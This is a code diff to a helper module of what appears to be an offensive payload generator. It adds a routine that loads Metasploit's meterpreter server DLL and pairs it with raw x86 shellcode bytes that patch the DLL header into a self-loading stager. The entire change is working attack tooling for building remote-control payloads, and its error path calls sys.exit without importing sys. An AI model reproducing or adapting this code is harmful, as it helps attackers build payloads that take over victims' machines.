@@ -3,7 +3,7 @@ Contains any miscellaneous helper methods useful across multiple modules.
 
 """
 
-import random, string, base64, zlib, re, textwrap, commands
+import random, string, base64, zlib, re, textwrap, commands, settings, os
 
     
 def color(string, status=True, warning=False, bold=True):
@@ -136,7 +136,19 @@ def obfuscateNum(N, mod):
 
 
 def selfcontained_patch():
+    if os.path.exists(settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.11/meterpreter/metsrv.x86.dll"):
+        metsrvPath = settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.11/meterpreter/metsrv.x86.dll"
+    else:
+        print "[*] Error: You either do not have the latest version of Metasploit or"
+        print "[*] Error: do not have your METASPLOIT_PATH set correctly in your settings file."
+        print "[*] Error: Please fix either issue then select this payload again!"
+        sys.exit()
+
+    f = open(metsrvPath, 'rb')
+    metDLL = f.read()
+    f.close()
+
     dllheaderPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\xf8"
     dllheaderPatch += "\x87\x05\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
     dllheaderPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
-    return dllheaderPatch
+    return metDLL, dllheaderPatch
